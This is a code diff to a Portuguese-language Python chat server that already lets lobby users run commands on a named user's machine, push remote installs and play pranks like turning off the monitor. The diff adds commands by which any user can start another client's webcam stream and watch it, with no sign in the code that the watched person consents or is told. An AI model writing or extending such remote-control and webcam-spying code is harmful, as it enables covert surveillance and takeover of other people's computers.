@@ -5,12 +5,15 @@ from remote_execution import execute_remote_command
 from easter_eggs.invert_mouse import invert_mouse
 from easter_eggs.limit_mouse_area import limit_mouse_area
 from easter_eggs.turn_off_monitor import turn_off_monitor
+from record_webcam import transmit_webcam
+from receive_webcam import receive_webcam
 import threading
 
 clients = []
 usernames = {}
 chat_clients = []
 connected_clients = {}
+webcam_streams = {}
 
 def handle_app_install(client_socket, connected_clients):
     """
@@ -69,8 +72,33 @@ def handle_command(msg, client_socket):
                 if username == target_username.strip():
                     execute_remote_command(content.strip())
                     break
-    except ValueError:
-        client_socket.send("Formato de comando inválido. Use @comando:target_username:content\n".encode())
+        elif command == "@webcam":
+            for client, username in usernames.items():
+                if username == target_username.strip():
+                    if content.strip() == "start_webcam":
+                        webcam_streams[target_username] = client
+                        threading.Thread(target=transmit_webcam, args=(client,)).start()  # Inicia a transmissão
+                    elif content.strip() == "receive_webcam":
+                        if target_username in webcam_streams:
+                            threading.Thread(target=receive_webcam, args=(webcam_streams[target_username],)).start()  # Inicia a recepção
+                        else:
+                            client_socket.send("[ERRO] Nenhuma transmissão ativa encontrada para o usuário especificado.\n".encode())
+                    break
+    except Exception as e:
+        print(f"[ERRO] Durante o processamento do comando: {e}")
+
+def handle_client_commands(client_socket):
+    while True:
+        command = client_socket.recv(1024).decode().strip()
+        if command == "start_webcam":
+            print("[INFO] Iniciando transmissão da webcam...")
+            transmit_webcam(client_socket)
+        elif command == "receive_webcam":
+            print("[INFO] Recebendo feed da webcam...")
+            receive_webcam(client_socket)
+        elif command == "exit":
+            print("[INFO] Conexão encerrada pelo servidor.")
+            break
 
 def exit_chat(client_socket, target_client=None):
     """
@@ -99,7 +127,7 @@ def redirect_to_menu(client_socket):
     try:
         while True:
             client_socket.send("******************* Lobby **********************\n".encode())
-            client_socket.send("Digite:\n '1' para entrar no chat!\n '2' para executar um comando!\n '3' Baixar arquivo remoto!\n 'exit' para sair do servidor.\n".encode())
+            client_socket.send("Digite:\n '1' para entrar no chat!\n '2' para executar um comando!\n '3' Baixar arquivo remoto!\n '4' Iniciar transmissão da webcam!\n 'exit' para sair do servidor.\n".encode())
 
             lobby_choice = client_socket.recv(1024).decode().strip().lower()
 
@@ -159,6 +187,19 @@ def redirect_to_menu(client_socket):
             elif lobby_choice == "3":
                 client_socket.send("[INFO] Iniciando processo de instalação remota...\n".encode())
                 handle_app_install(client_socket, connected_clients)
+
+            elif lobby_choice == "4":
+                client_socket.send("[INFO] Iniciando transmissão da webcam...\n".encode())
+                client_socket.send("Digite o comando no formato: @webcam:nomeUsuario:start_webcam ou @webcam:nomeUsuario:receive_webcam\n".encode())
+                while True:
+                    command_msg = client_socket.recv(1024).decode().strip()
+                    if command_msg.lower() == "exit_webcam":
+                        client_socket.send("Você saiu da seção de webcam.\n".encode())
+                        break
+                    elif command_msg.startswith("@webcam:"):
+                        handle_command(command_msg, client_socket)
+                    else:
+                        client_socket.send("Formato de comando inválido. Use @webcam:nomeUsuario:start_webcam ou @webcam:nomeUsuario:receive_webcam\n".encode())
 
             elif lobby_choice == "exit":
                 client_socket.send("Você saiu do servidor.\n".encode())
